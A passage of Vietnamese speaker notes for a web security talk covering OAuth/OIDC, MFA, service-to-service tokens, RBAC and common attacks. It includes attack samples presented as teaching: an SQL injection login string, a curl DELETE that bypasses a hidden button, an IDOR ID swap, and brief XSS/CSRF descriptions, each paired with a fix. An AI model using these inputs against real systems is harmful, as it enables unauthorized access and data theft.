- **Refresh Token:** đổi refresh token lấy access token mới, khỏi login lại.
**→ 1:** Hàng mờ: legacy, tránh. **Implicit** — token về thẳng trong URL, đã deprecated. **Resource
Owner Password** — app tự thu password của bạn, đúng cái anti-pattern ở 3.1; OAuth 2.1 bỏ hẳn.
**Chốt:** Có user và có backend → Authorization Code (+ PKCE). Không có user → Client Credentials.

### 34 · Same Claude, two buttons. An access token says what Claude may do. An id_token says who you are.
_~90 s · ⏱ tới 31:50_

**Nói:** Một chỗ hay nhầm: OAuth là *authorization*, không phải login. Cùng là Claude, có hai nút
Google khác nhau. Bên trái: **"Connect Google Calendar"** trong Claude — chỉ OAuth, `scope=calendar.readonly`,
nhận về `access_token`. Nó nghĩa là "Claude được đọc lịch của bạn". Nó không nói gì về bạn là ai.
**→ 1:** Bên phải: **"Continue with Google"** trên trang login của claude.ai — **OIDC** đặt trên OAuth.
Cùng code flow, thêm `scope=openid email profile`, và Google trả thêm một **`id_token`**: một JWT về
bạn, làm riêng cho Claude. Đó mới là thứ login bạn. Nhìn bên dưới: chính là JWT ở section 2 — `iss` là
Google, `sub`, `email`, và `aud` là `client_id` của Claude, `exp`.
**→ 2:** Ba luật. Đừng login user bằng `access_token`: token mà app *khác* xin được cho user đó cũng
sẽ chạy trên app của mình. Verify bốn thứ: signature bằng public key của Google, `iss`, `aud` là
`client_id` **của mình**, `exp` — thư viện làm hết. Lưu user theo `sub`, không theo email: email Google
đổi được, `sub` thì không bao giờ. Và một dòng gợi tò mò: OIDC còn chạy được khi *không có người* —
GitHub chứng minh một workflow là ai với AWS, ở section 4.
**Chốt:** `access_token` = được làm gì. `id_token` = bạn là ai.

### 35 · A stolen password is not enough when login also needs a second factor of a different kind
_~70 s · ⏱ tới 33:00_

**Nói:** Còn nếu password bị lộ thì sao? MFA. Ba loại yếu tố: thứ bạn *biết* — password, PIN; thứ bạn
*có* — điện thoại, security key; thứ bạn *là* — vân tay, khuôn mặt. Hai yếu tố phải **khác loại**.
Hỏi phòng: password cộng câu hỏi bảo mật có phải hai yếu tố không? (Chờ.) Không — cả hai đều là thứ
bạn biết.
**→ 1:** Ba kiểu yếu tố thứ hai hay gặp. TOTP — Google Authenticator: điện thoại và server chung một
secret, mã 6 số đổi mỗi 30 giây, chạy offline; trang giả vẫn có thể hỏi mã và dùng ngay. Mặc định tốt.
SMS OTP: yếu nhất, vì SIM swap — attacker thuyết phục nhà mạng chuyển số của bạn sang SIM của họ.
Passkey: thiết bị ký một challenge bằng private key, chỉ trả lời đúng domain thật, không có gì để gõ
nên trang giả không có gì để lấy. Mạnh nhất.
**→ 2:** MFA là chuyện của AuthN, xảy ra lúc login. Với "Continue with Google" trên claude.ai thì
**Google** hỏi yếu tố thứ hai. Claude không bao giờ thấy, chỉ nhận `id_token`.
_(Bị trễ: slide cắt đầu tiên — chỉ đọc tiêu đề + câu "TOTP tốt, SMS yếu nhất, passkey mạnh nhất".)_

### 36 · Rent login from a provider, and keep the secret on the server
_~60 s · ⏱ tới 34:00_

**Nói:** Mang về. Mỗi hàng: trái đừng làm, phải nên làm.
- **Provider:** đừng hỏi password Google của user, đừng tự build OAuth server. Redirect sang Google và dùng SDK của nó, như Claude làm — hoặc Auth0, Keycloak, Cognito.
- **Secret:** đừng để `client_secret` trong React, app mobile hay git — ai cũng đọc được bundle. Chỉ ở backend, `process.env.GOOGLE_CLIENT_SECRET`.
- **Scope:** đừng xin `scope=calendar` — toàn quyền đọc ghi. Xin `calendar.readonly`, nhỏ nhất mà đủ dùng.
- **Callback:** đừng nhận bất kỳ `?code=` nào — attacker có thể làm mình login vào tài khoản của họ. Kiểm `state` khớp; không khớp thì không login.
- **Identity:** đừng login bằng `access_token` — token của app khác cũng xài được trên app mình. Verify `id_token`, lưu user theo `sub` vì `sub` không bao giờ đổi.

---

# Phần 4 — Service-to-service · ⏱ 34:00 → 46:00

### 37 · Divider 04 — Service-to-service
_~10 s · ⏱ tới 34:10_

**Nói:** Tới giờ luôn có một người ngồi trước browser. Giờ bỏ người đi: không user, không browser,
không form login. Service gọi service vẫn phải chứng minh mình là ai.

### 38 · Inside the cluster, any pod can call Payments
_~60 s · ⏱ tới 35:10_

**Nói:** Ví dụ xuyên suốt phần này: một shop có Frontend, user ở đó. Frontend gọi **Orders**, Orders
gọi **Inventory** và **Payments** — Payments là chỗ trừ tiền thẻ. Nhìn bên phải: vì sao những gì vừa
học không áp dụng. Không browser nên không có cookie để gửi. Không người nên không ai gõ password.
Orders chạy lúc 3 giờ sáng một mình. Không ai ngồi đó bấm Allow trên consent screen.
**→ 1:** Hôm nay: một pod bị chiếm gọi thẳng `POST /charges` → `201`. Payments tin bất kỳ thứ gì tới
được nó trong mạng nội bộ. Một pod bị hack là trừ được tiền thẻ bất kỳ ai.
**→ 2:** Thứ mình muốn: mỗi service có danh tính riêng, và Payments kiểm danh tính đó trên mọi call.

### 39 · Your turn — Orders calls Payments, no user involved. How does Payments know the caller is really Orders?
_~60 s · ⏱ tới 36:10_

**Nói:** Đọc to: Orders gọi Payments, không có user nào. Làm sao Payments biết người gọi đúng là Orders?
Câu hỏi mở. "30 giây, bàn với người bên cạnh." Chờ ~30 s, nghe 1–2 câu. Ai nói "check IP" thì hỏi: "pod
bị chiếm nằm cùng mạng, IP đổi mỗi lần deploy thì sao?" Ai nói "API key" thì khen — gần đúng rồi, slide
sau xem nó hỏng ở đâu.
**→ 1:** Cho Orders một **danh tính riêng**, rồi để nó đổi danh tính đó lấy một token ngắn hạn mà
Payments kiểm được. Giống y user login lấy vé ở section 2, chỉ là người login giờ là một service.
**Chốt:** "Trước hết, xem cách mà ai cũng làm đầu tiên: một API key dùng chung."

### 40 · A shared API key works until it leaks
_~60 s · ⏱ tới 37:10_

**Nói:** Cột trái: static API key. Orders gửi `X-Api-Key: sk_live_8f2a…`. Không bao giờ hết hạn, trừ khi
có người rotate bằng tay. Không biết ai đang gọi, vì cùng một key được dán vào mọi service. Mở được mọi
thứ key đó mở. Và nếu lộ — vào log, vào git — thì chạy mãi, từ bất kỳ đâu.
**→ 1:** Cột phải: **Client Credentials**. Orders gửi `Authorization: Bearer` một JWT. Hết hạn sau 5
phút, `expires_in: 300`. Ai gọi được ghi trong token: `sub: orders-service`. Chỉ làm được đúng thứ nó
xin: `scope: payments.charge`. Lộ thì 5 phút là thành rác, và secret thật chưa bao giờ rời Orders.
**→ 2:** Ý tưởng: Orders giữ một `client_id` + `client_secret` — như username và password của một
service — chỉ đưa cho **auth server**, và nhận lại một token ngắn hạn có scope. Slide sau là cuộc trao đổi đó.
_(Bị trễ: slide cắt thứ hai — chỉ nói hàng "if it leaks" rồi qua 4.3.)_

### 41 · Orders logs in as itself and gets a 5-minute token
_~80 s · ⏱ tới 38:30_

**Nói:** Animation, giống flow của 3.3 nhưng không có browser. Bước 0 chạy ngay khi vào slide: Orders
đã được đăng ký **một lần** với auth server. `client_id` + `client_secret` của nó là username và
password cho một service. Secret nằm trong secret manager, không nằm trong code.
**→ 1 (ask for a token):** Orders tự login: `POST /oauth/token` với `grant_type=client_credentials`,
`client_id=orders-service`, secret, và đúng một scope nó cần: `payments.charge`. Không có user, không
redirect, không consent screen.
**→ 2 (5-minute JWT back):** Auth server trả về một JWT đã ký, `expires_in: 300` — chết sau 300 giây.
Orders cache nó và dùng lại cho tới khi hết hạn, không xin mỗi request.
**→ 3 (call Payments):** `POST /charges` với `Authorization: Bearer …`. Payments tự kiểm token, không
cần gọi lại auth server. Secret không bao giờ rời Orders.
**Chỉ vào ghi chú:** cùng OAuth của section 3, chỉ bớt đi user. Đây chính là grant Client Credentials
trong bảng grant types, slide 3.5.

### 42 · The token says who is calling, for whom, and what it may do
_~50 s · ⏱ tới 39:20_

**Nói:** Mở token đó ra. `iss` — ai làm ra nó: Payments chỉ tin auth server của mình. `sub` — ai đang
gọi: `orders-service`, một tên service chứ không phải user. `aud` — gửi cho ai: `payments-service`;
Payments từ chối token làm cho ai khác. `scope` — được làm gì: trừ tiền thẻ, không hơn. `exp` — khi
nào chết: 300 giây sau `iat`, token bị đánh cắp 5 phút là vô dụng.
**→ 1:** Và đây vẫn là JWT của section 2: header, payload, signature. Ai cũng đọc được, nên không có
bí mật bên trong.

### 43 · Your turn — Payments gets a correctly signed token, but aud is inventory-service. Accept it?
_~60 s · ⏱ tới 40:20_

**Nói:** Payments nhận một token ký đúng, signature hoàn toàn hợp lệ, nhưng `aud` là
`inventory-service`. Nhận không? A: có, signature hợp lệ. B: không, token làm cho người khác. "30 giây."
Chờ ~30 s, nghe 1–2 câu. Ai chọn A: "vậy ai lấy được token từ Inventory — service ít quan trọng hơn, có
khi bảo mật kém hơn — thì làm gì được với Payments?"
**→ 1:** B. Token đánh cắp từ Inventory không được chạy trên Payments. Kiểm `aud` trên mọi request —
đúng cái luật "reject others" của MCP ở 3.4.
**Chốt:** Signature đúng chỉ nói "auth server làm ra nó", không nói "nó dành cho mình".

### 44 · Payments checks the token, then the scope
_~60 s · ⏱ tới 41:20_

**Nói:** Payments làm hai bước, theo thứ tự. Bước một, **validate**: token này thật không, và có dành
cho mình không? Signature khớp public key của auth server, `iss` đúng `https://auth.shop.internal`,
`aud` là `payments-service`, `exp` chưa qua. Thư viện làm bằng một dòng `verify(token, { issuer,
audience })`. Sai bất kỳ cái nào → `401`.
**→ 1:** Bước hai, **authorize**: caller này có được làm việc này không? Scope map sang endpoint:
`payments.charge` → `POST /charges`, `payments.read` → `GET /charges/*`. Orders chỉ có
`payments.charge`, nên không liệt kê được charges. Token hợp lệ mà sai scope → `403`.
**→ 2:** Nhớ slide 0.3 không? Y chang với user: `401` = chưa biết bạn là ai, `403` = biết rồi, câu trả
lời là không.

### 45 · Your turn — Your GitHub Action deploys to AWS. Where do you keep the AWS keys?
_~60 s · ⏱ tới 42:20_

**Nói:** Một service-to-service mà ai trong phòng cũng sẽ gặp: CI. GitHub Action của bạn deploy lên AWS.
Vậy AWS key cất ở đâu? Câu hỏi mở. "30 giây." Chờ, nghe 1–2 câu. Thường sẽ có người nói "GitHub
secrets" — đúng là cách phổ biến, hỏi lại: "key đó sống bao lâu? Ai rotate? Lộ thì sao?"
**→ 1:** Không ở đâu cả. GitHub chứng minh repo và branch nào đang chạy bằng một **OIDC token**; AWS đổi
nó lấy credentials hết hạn sau khoảng 1 giờ. Đây là cái `id_token` của 3.6, nhưng cho một workflow.
**Chốt:** "Xem nó chạy thế nào."

### 46 · GitHub deploys to AWS without a stored key
_~90 s · ⏱ tới 43:50_

**Nói:** Animation bốn bước. Bước 0 chạy ngay khi vào slide: một push lên `main` khởi động workflow.
Repo **không có AWS key** nào trong secrets. Nhìn YAML bên dưới: `permissions: id-token: write` cho
phép workflow xin GitHub một OIDC token.
**→ 1 (OIDC token from GitHub):** GitHub ký một JWT nói **repo nào, branch nào** đang chạy, gửi cho
AWS: issuer `token.actions.githubusercontent.com`, `aud: sts.amazonaws.com`,
`sub: repo:spartan/shop:ref:refs/heads/main`.
**→ 2 (send it to AWS STS):** Action `configure-aws-credentials` gửi token đó tới AWS STS và xin trở
thành role `deploy` — dòng `role-to-assume` trong YAML.
**→ 3 (trust policy → 1 h creds):** STS kiểm issuer, `aud` và `sub` với trust policy của role — hai
điều kiện bên phải: chỉ repo này, chỉ `main`. Một fork hay một branch khác có `sub` khác → bị từ
chối. Khớp thì STS trả credentials tạm, sống khoảng 1 giờ.
**→ 4 (deploy):** `aws s3 sync`, deploy xong. Không có `AWS_ACCESS_KEY_ID` trong GitHub secrets: không
có gì để lộ, không có gì để rotate. Credentials tự hết hạn. Link GitHub docs ở góc dưới, chụp lại.
**Chốt:** Không lưu key nào là key không bao giờ lộ.

### 47 · Other ways services prove who they are
_~60 s · ⏱ tới 44:50_

**Nói:** Client Credentials không phải cách duy nhất. Ba cái tên các bạn sẽ nghe, chỉ cần biết khái
niệm. **mTLS** — mutual TLS: HTTPS bình thường thì chỉ server chứng minh mình là ai; với mTLS, bên gọi
cũng trình một certificate. Danh tính được kiểm ngay lúc mở kết nối, trước khi có request nào. Giá phải
trả: ai đó phải cấp và gia hạn certificate cho mọi service.
**→ 1:** **Service mesh** — Istio, Linkerd: mTLS làm hộ. Một proxy nhỏ, "sidecar", chạy cạnh mỗi service
và lo certificate; code vẫn gọi HTTP thường. Hợp khi có nhiều service và một platform team. Thêm một hệ
thống phải vận hành.
**→ 2:** **API key**: ổn cho API bên thứ ba đơn giản — Stripe, SendGrid, Google Maps đưa bạn một key.
Cất trong secret manager, mỗi env một key, rotate khi lộ hoặc khi có người nghỉ. Không dùng cho service
của mình: không hết hạn, không scope, không danh tính.
**→ 3:** Một câu để nhớ: OAuth = cách lấy token · JWT = token trông thế nào · policy của Payments = bạn
được làm gì.

### 48 · One identity per service, and tokens that are short, narrow and addressed to one receiver
_~70 s · ⏱ tới 46:00_

**Nói:** Mang về. Mỗi hàng: trái đừng làm, phải nên làm.
- **Secret:** đừng `client_secret = "s3cr3t"` trong code hay git — ai có repo là có. Để trong secret manager (AWS Secrets Manager, Vault), rotate không cần redeploy.
- **Lifetime:** đừng xài `X-Api-Key` không bao giờ hết hạn — lộ là chạy mãi. `expires_in: 300`, cache tới khi hết hạn; lộ thì vài phút là chết.
- **Audience:** đừng nhận mọi token ký đúng — token của Inventory sẽ chạy trên Payments. `aud === "payments-service"`, không thì `401`.
- **Scope:** đừng một `scope: admin` làm được mọi thứ. `payments.charge`, `payments.read` — nhỏ nhất mà đủ, không thì `403`.
- **Identity:** đừng để mọi service chung một client — log không nói được ai đã trừ tiền thẻ. Mỗi service một `client_id`, log `sub`.
- **Keys in CI:** đừng để `AWS_ACCESS_KEY_ID` trong repo secrets — key sống nhiều năm. OIDC role theo repo + branch, credentials 1 giờ, không lưu gì.

---

# Phần 5 — Phân quyền & attack · ⏱ 46:00 → 53:00

### 49 · Divider 05 — Permissions & attacks
_~10 s · ⏱ tới 46:10_

**Nói:** Xong phần "bạn là ai" — cho cả người lẫn service. Giờ là trạm hai: ai được làm gì. Và cuối
cùng, bốn attack kinh điển để các bạn tự học.

### 50 · Your code should ask "may this user delete orders?", never "is this user an admin?"
_~70 s · ⏱ tới 47:20_

**Nói:** **RBAC** — Role-Based Access Control. User có một role, role chỉ là một danh sách permission
có tên. Bảng: `viewer` chỉ `orders:read`; `editor` thêm `orders:write`; `admin` có cả `orders:delete`.
Bảng này nằm ở một chỗ — config hoặc một bảng DB — không rải khắp các handler. Giống `scope` của
Payments ở 4.5: cũng là "được làm gì", chỉ là cho user.
Code bên trái: `if (user.role === "admin")`. Thêm role mới là phải sửa mọi cái `if`.
**→ 1:** Thay vào đó, kiểm *permission*: `if (can(user, "orders:delete"))`. Hàm `can()` tra role trong
bảng.
**→ 2:** Vì sao? Mai có thêm role `support` được phép xoá. Mình sửa một dòng trong bảng, chứ không phải
40 câu `if`.

### 51 · Your turn — The Delete button is hidden for viewers. Is the API safe? How would you check?
_~60 s · ⏱ tới 48:20_

**Nói:** Câu này cho các bạn frontend. Nút Delete đã ẩn với viewer. Vậy API có an toàn không, và kiểm tra
bằng cách nào? Câu hỏi mở. "30 giây." Chờ, rồi nghe 1–2 câu. Ai nói "an toàn" thì hỏi: "ngoài cái nút ra,
còn cách nào gửi một request `DELETE`?"
**→ 1:** Không. Tự gửi `DELETE` bằng curl với cookie của một viewer là biết. curl không bao giờ thấy UI
của bạn.
**Chốt:** "Xem attacker làm chuyện đó thế nào."

### 52 · The frontend hid the Delete button. Anyone with curl can still call the API.
_~50 s · ⏱ tới 49:10_

**Nói:** Viewer nhìn thấy dòng đơn hàng với nút View, còn nút Delete thì bị ẩn bằng
`{user.role === "admin" && <DeleteButton />}`. Như vừa đoán: chưa an toàn. Browser là máy của user: họ
mở DevTools, sửa trang, hoặc bỏ qua trang và dùng curl, Postman.
**→ 1:** Attacker gõ `curl -X DELETE …/orders/1024` với cookie session của chính viewer đó → `204` — xoá
mất. Bug: API tin UI sẽ kiểm. Không có gì trên server hỏi "user này có được xoá không?"
**→ 2:** Fix nằm ở server: `requirePermission("orders:delete")` trước handler → `403 Forbidden`. Ẩn nút
là để UI đẹp. Mọi kiểm tra quyền phải chạy cả ở backend, trên mọi request.

### 53 · "Logged in" is not "allowed": check that the row belongs to this user
_~80 s · ⏱ tới 50:30_

**Nói:** An mở đơn của mình: `GET /orders/1024` → `200`, owner `"an"`. Endpoint này kiểm "có session
hợp lệ không" rồi dừng. Hỏi phòng: An làm gì tiếp theo? (Chờ — thường có người đoán ra.)
**→ 1:** An đổi một chữ số: `/orders/1025` → `200`, owner `"binh"`, kèm luôn địa chỉ. Đó là **IDOR** —
Insecure Direct Object Reference: cái ID trên URL là ổ khoá duy nhất. Broken access control đứng số
một trong OWASP Top 10, danh sách rủi ro web.
**→ 2:** Fix: đưa chủ sở hữu vào chính câu query — `WHERE id = ? AND user_id = ?`, với `req.user.id`.
Không có dòng nào → `404`, giống y như đơn không tồn tại. Lấy user từ session, không bao giờ từ request
body. Còn ID random kiểu UUID thì khó đoán hơn, nhưng không phải cách fix — ID vẫn lộ qua log và link.
**Chốt:** "Đã login" không có nghĩa là "được phép".

### 54 · Four classic attacks, each with a one-line fix. The links have free hands-on labs.
_~70 s · ⏱ tới 51:40_

**Nói:** Bốn attack kinh điển. Hôm nay mình không mổ từng cái — mỗi card một dòng "là gì", một dòng
fix, và hai link có lab miễn phí để tối nay về tự phá thử. Chụp slide này lại.
- **SQL injection:** input nối vào câu SQL bằng `+` thành một phần của query — `' OR '1'='1` là login vào bằng ai cũng được. Fix: placeholder `?`, `db.query("… WHERE email = ?", [email])`.
- **XSS:** trang render text của user thành HTML, nên `<script>` của attacker chạy trên browser mọi người đọc — và đọc được `localStorage`, nhớ 2.5. Fix: để framework escape, `{comment.text}`, không `innerHTML` với text của user.
- **CSRF:** site khác submit form tới API của mình, browser tự gắn cookie của user. Fix: `SameSite=Lax` trên cookie, cộng CSRF token trong mọi form.
- **Brute force & credential stuffing:** bot thử hàng triệu password, hoặc cặp email + password lộ từ site khác. Fix: rate-limit login, ví dụ 5 lần mỗi phút theo account và IP, và cho bật MFA (3.7).
**Chỉ xuống dòng cuối:** bắt đầu từ OWASP Top 10, rồi PortSwigger Web Security Academy — lab miễn phí,
có sẵn app lỗi để tấn công hợp pháp.
**Chốt:** Bốn lỗi, bốn fix một dòng. Phần còn lại là luyện tay.

### 55 · Ten things to check before you open a pull request that touches login or data
_~80 s · ⏱ tới 53:00_

**Nói:** Mười dòng gom từ tất cả slide "Do / Don't". Chụp hình slide này lại nha. Đọc nhanh theo nhãn:
- **password:** hash bằng `bcrypt` hoặc `argon2` của thư viện, không lưu, không log, không trả password.
  Login sai chỉ nói chung chung "sai email hoặc password", không bao giờ nói sai cái nào.
- **token:** để trong cookie `HttpOnly; Secure; SameSite`, không `localStorage`. Verify mọi JWT bằng thư
  viện với thuật toán cố định, payload không có gì bí mật. Access token ngắn 15 phút, logout xoá refresh
  token trên server.
- **oauth:** `client_secret` chỉ ở backend, từ env hoặc secret manager, xin scope nhỏ nhất.
- **authz:** kiểm quyền ở backend, mọi request, kiểm permission chứ không kiểm tên role. Kiểm quyền sở
  hữu ngay trong query: `WHERE id = ? AND user_id = ?`.
- **attack:** SQLi, XSS, CSRF, brute force — làm theo link ở 5.4.
- **service:** mỗi service một `client_id`, kiểm `aud` và `scope` trên mọi call.
**Chốt:** Lần tới mở PR đụng tới login hay data, dò qua mười dòng này.

---

# Cảm ơn — Q&A + Kahoot · ⏱ 53:00 → ~63:00

### 56 · Thank you + Kahoot
_~10 phút · ⏱ tới ~63:00_

**Nói:** Xong rồi đó. Cảm ơn mọi người đã nghe. Hỏi đáp trước, rồi một ván Kahoot ngắn: 401 hay 403, hash
hay encrypt, cookie flag nào, và hai câu service-to-service.

**Q&A (~3–4 phút):**
- Mời hỏi: "Có câu nào về phần nào cũng được, kể cả câu nghe có vẻ cơ bản — chắc chắn có người khác cũng
  đang thắc mắc giống vậy."
- Nhắc lại câu hỏi to cho cả phòng nghe trước khi trả lời. Trả lời bằng cách chỉ lại slide liên quan
  (`O` mở overview để nhảy nhanh, `Esc` đóng).
- Câu nào ngoài phạm vi bài (ví dụ những thứ đã cắt khỏi outline: JWKS, key rotation, cấu hình mesh…)
  thì nói thật: "Phần đó hôm nay mình không nói tới, mình trao đổi riêng sau nha", đừng mở chủ đề mới.
- Hết giờ thì chốt: "Còn câu nào thì nhắn mình sau, giờ qua Kahoot."

**Kahoot (~6 phút):**
1. Mở game đã chuẩn bị (12 câu trong `presentation/notes/kahoot-questions.md`) ở tab khác, lấy PIN.
2. Quay lại slide, click vào ô **Game PIN**, gõ PIN. QR tự cập nhật trỏ tới `kahoot.it` kèm PIN. Click ra
   ngoài ô trước khi bấm phím khác.
3. "Quét QR hoặc vào kahoot.it, nhập PIN trên màn hình." Chờ tới khi đa số đã vào.
4. Chuyển màn hình sang Kahoot và chạy. Sau mỗi câu, đọc nhanh phần "Giải thích" trong file câu hỏi —
   một câu thôi, nối lại với slide tương ứng.
5. Công bố top 3, cảm ơn lần nữa, kết thúc.

---

## Mấy câu hay được hỏi

Chỉ trả lời trong phạm vi slide; mỗi câu dẫn về slide tương ứng.

- **"Vậy nên dùng session hay JWT?"** → Slide 24. Web app một backend, cần logout ngay: session. Nhiều
  service tự kiểm token, hoặc mobile app: JWT, với access token ngắn + refresh token trên server.
- **"Để token trong localStorage có sao không, team em đang làm vậy?"** → Slide 26 và 54. Một script XSS
  là đọc được. Mặc định là cookie `HttpOnly; Secure; SameSite=Lax`.
- **"Sao không encrypt password, lỡ cần lấy lại cho user?"** → Slide 12. Không bao giờ cần đọc lại
  password, chỉ cần kiểm tra.
- **"Server trả 401 hay 403 khi token hết hạn?"** → Slide 7: `401` — server không còn biết bạn là ai, đi
  login (hoặc refresh) lại. Với service cũng vậy (slide 44).
- **"Claude có đọc được hết Gmail của em không?"** → Slide 31 và 32. Claude chỉ thấy những gì tài khoản
  Google của bạn thấy, trong phạm vi `scope` bạn đã Allow trên consent screen, và bạn Disconnect được bất
  cứ lúc nào. Đừng hứa thêm chi tiết về tính năng cụ thể của connector.
- **"Service nội bộ sau firewall rồi, cần token làm gì?"** → Slide 38. Một pod bị chiếm là đứng ngay trong
  mạng nội bộ. Mỗi service một danh tính, Payments kiểm trên mọi call.
- **"Khi nào dùng mTLS / service mesh thay cho Client Credentials?"** → Slide 47. Khi có nhiều service và
  một platform team vận hành mesh; hôm nay chỉ cần biết khái niệm.
- **"Dùng UUID thay cho ID tăng dần là hết IDOR rồi đúng không?"** → Slide 53. Khó đoán hơn, nhưng không
  phải fix. Fix là `AND user_id = ?` trong query.
- **"Ẩn nút ở frontend rồi, backend có cần kiểm nữa không?"** → Slide 52. Có. Ai có curl cũng gọi được API.
